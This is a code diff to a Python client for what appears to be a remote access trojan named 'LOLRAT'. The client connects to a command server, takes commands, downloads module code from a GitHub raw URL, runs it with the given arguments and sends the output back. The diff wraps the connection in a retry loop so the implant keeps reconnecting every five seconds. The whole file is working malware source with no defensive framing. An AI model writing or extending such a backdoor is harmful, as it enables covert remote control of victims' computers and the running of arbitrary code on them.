@@ -2,6 +2,7 @@ import os
 import socket
 import subprocess
 import requests
+import time
 
 def fetch_url_and_execute_cmd(url, args):
     try:
@@ -26,27 +27,34 @@ def fetch_url_and_execute_cmd(url, args):
 host = "127.0.0.1"  # Replace with the actual server IP address
 port = 12345  # Replace with the actual port the server is listening on
 
-# Establish connection with the server
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
-    client_socket.connect((host, port))
-    print("Connected to the server")
+while True:
+    try:
+        # Establish connection with the server
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+            client_socket.connect((host, port))
+            print("Connected to the server")
 
-    # Listen for commands indefinitely
-    while True:
-        # Receive a command from the server
-        command = client_socket.recv(1024).decode('utf-8')
+            # Listen for commands indefinitely
+            while True:
+                # Receive a command from the server
+                command = client_socket.recv(1024).decode('utf-8')
 
-        # Split the received command to get the module and arguments
-        before, after = command.split("$")
+                # Split the received command to get the module and arguments
+                before, after = command.split("$")
 
-        # Convert 'after' to a list with one element
-        arguments = [after]
+                # Convert 'after' to a list with one element
+                arguments = [after]
 
-        # Make url
-        url = f"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/{before}.py"
+                # Make url
+                url = f"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/{before}.py"
 
-        # Fetch and execute with the converted arguments list
-        output = fetch_url_and_execute_cmd(url, arguments)
+                # Fetch and execute with the converted arguments list
+                output = fetch_url_and_execute_cmd(url, arguments)
 
-        # Send the output back to the server
-        client_socket.send(output.encode('utf-8'))
+                # Send the output back to the server
+                client_socket.send(output.encode('utf-8'))
+    except ConnectionRefusedError:
+        print("Connection refused. Retrying in 5 seconds...")
+        time.sleep(5)  # Wait for 5 seconds before retrying
+    except Exception as e:
+        print(f"An error occurred: {e}")
